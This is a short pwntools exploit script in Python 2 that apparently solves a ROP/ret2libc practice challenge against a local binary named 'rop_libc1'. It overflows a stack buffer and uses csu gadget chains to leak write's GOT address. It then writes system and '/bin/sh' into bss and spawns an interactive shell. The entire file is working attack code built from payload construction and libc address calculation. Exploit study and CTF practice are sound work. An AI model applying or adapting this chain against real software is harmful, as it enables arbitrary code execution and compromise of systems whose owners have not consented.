from pwn import *

#sh = gdb.debug(['./rop_libc1'])
#r12 = ret_addr

#r13 = rdi = arg1   r14 = rsi = arg2    r15 = rdx = arg3

#rbx = 0    rbp = 1

sh = process('./rop_libc1')

elf = ELF('./rop_libc1')
libc = ELF('./libc.so')

main = 0x401153
bss = 0x0404038
read_got = elf.got['read'] 

write_got = elf.got['write']
print "write_got= " + hex(write_got)
write_libc = libc.symbols['write']
print "write_libc= " + hex(write_libc)
system_libc = libc.symbols['system']
print "system_libc= " + hex(system_libc)
bin_sh_libc = libc.search('/bin/sh').next()
print "bin_sh_libc= " + hex(bin_sh_libc)

#get the address of write
payload1 = 'a'*0x88  + p64(0x4011e2) + p64(0) + p64(1) + p64(write_got) + p64(1) + p64(write_got) + p64(8)
payload1 += p64(0x4011c8) + 'd' * 56 + p64(main)

sh.recvuntil("Hello, World\n")
sh.sendline(payload1)
sleep(0.5)

write_addr = u64(sh.recv(8))
print "write_addr= " + hex(write_addr)
print "system_addr= " + hex(system_libc+write_addr -write_libc)
sleep(0.5)
sh.recvuntil("Hello, World\n")

system_addr = p64(system_libc + write_addr - write_libc)
#get the address of system and bin_sh
payload2 = 'a'*0x88 + p64(0x4011e2) + p64(0) + p64(1) + p64(0x00404020) + p64(0) + p64(bss) + p64(16) + p64(0x4011c8) + 'f'*56 + p64(main)
sh.sendline(payload2)
sleep(0.5)
sh.sendline(system_addr+"/bin/sh\0")
#sh.send("/bin/sh\0")

sh.recvuntil("Hello, World\n")

#activate the system("/bin/sh")
payload3 = 'a'*0x87 + p64(0x4011e2) +p64(0) + p64(1) + p64(bss) + p64(bss+8)  +p64(0)+p64(0) +p64(0x4011c8)  + 'd' *56 + p64(main)
sh.sendline(payload3)

sh.interactive()






